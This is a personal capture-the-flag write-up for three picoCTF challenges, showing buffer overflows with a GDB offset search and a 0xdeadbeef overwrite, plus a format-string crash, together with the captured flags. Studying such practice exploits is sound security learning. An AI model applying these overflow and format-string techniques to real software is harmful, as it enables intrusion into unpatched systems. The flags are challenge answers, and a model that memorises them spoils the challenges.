# 1. buffer overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Connect using:
nc saturn.picoctf.net 49815

## Solution:

- on opening the .c file i first read that the maximum input we could give was of 64 characters. 
- So...just for trial since it is called buffer OVERFLOW, i entered more that 64 characters to see what happens. i entered 70 characters and got the flag :))
```bash 
   rochelle@DESKTOP-IF15GUC:~$ nc saturn.picoctf.net 49815
   Input: 1234567890123456789012345678901234567890123456789012345678901234567890
   picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

***
# 2. Clutter overflow

> Clutter, clutter everywhere and not a byte to use.

## Solution:

- on opening the .nc file, i get 
```bash
     ______________________________________________________________________
     |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
     | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
     |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
     | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
     |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
     | ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
     |^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
     | ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
     |^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
     .-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
     |     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
     | ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
     |'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
     |\|______|===============|________________|/|""""""""""""""""""""""""""
     " ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
     ""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
     """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
     """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
     My room is so cluttered...
     What do you see?
```
- I type in anything and get error `code == 0x0 code != 0xdeadbeef :(`
- In the code, we can see `#define SIZE 0x100 #define GOAL 0xdeadbeef` and `gets(clutter);` meaning we can use buffer overflow
- We need the code we enter to be equal to `deadbeef`
- I opened the code in GDB
- I created a pattern using `pattern_create` and then ran the file, pasting a large pattern in it (pasted 500 characters)
- i got segmentation fault
```bash
  Program received signal SIGSEGV, Segmentation fault.
  0x00000000004007c0 in main ()
```
- I check the registers 
``` bash
 info registers rbp rip
 rbp            0x3425416525414925  0x3425416525414925
 rip            0x4007c0            0x4007c0 <main+249>
```
- Searching for the pattern string at `0x3425416525414925` i get string `%IA%eA%4`
- This pattern is at offset 272. So we can adjust the bytes we enter and thus get the 0xdeadbeef. We need 264 characters precisely (272-deadbeef)
- 0xdeadbeef in little edian format is `\xef\xbe\xad\xde` so after 264 characters i type this also in
this gave me
```bash
   code == 0xdeadbeef: how did that happen??
   take a flag for your troubles
   picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:
- `gets` function is vulnerable to buffer overflow, so its presence in a code gives us a clue
- `pattern_create` in GDB creates a character set of how many ever character u wish to input in it
- `$rbp` is
- little endian formate refers to
- 

## Notes:

- I had to install PEDA since my system did not have that
# 3. Format string 0

> Can you use your knowledge of format strings to make the customers happy?

## Solution:

- On opening the netcat i get offered a menu. If i enter Breakf@st_Burger, i get error. 
- I looked at the hint, it is telling me to research about format specifires.
- There are various kinds of format specifiers like %d, %s etc. This makes me realised that certain options in the menu have format specifiers in them!!
- In the first menu, `Gr%114d_Cheese` has format specifier `%114d` and in the second one, `Cla%sic_Che%s%steak` has specifier `%s`.
```bash
  Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
  Here comes the first customer Patrick who wants a giant bite.
  Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
  Enter your recommendation: Gr%114d_Cheese
  Gr                                                                                                           4202954_Cheese
  Good job! Patrick is happy! Now can you serve the second customer?
  Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
  Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
  Enter your recommendation: Cla%sic_Che%s%steak
  ClaCla%sic_Che%s%steakic_Che
  picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```
## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

## Concepts learnt:
- The different kinds of format specifiers are %s (this is vulnerable), %d (for integers), %c, etc.
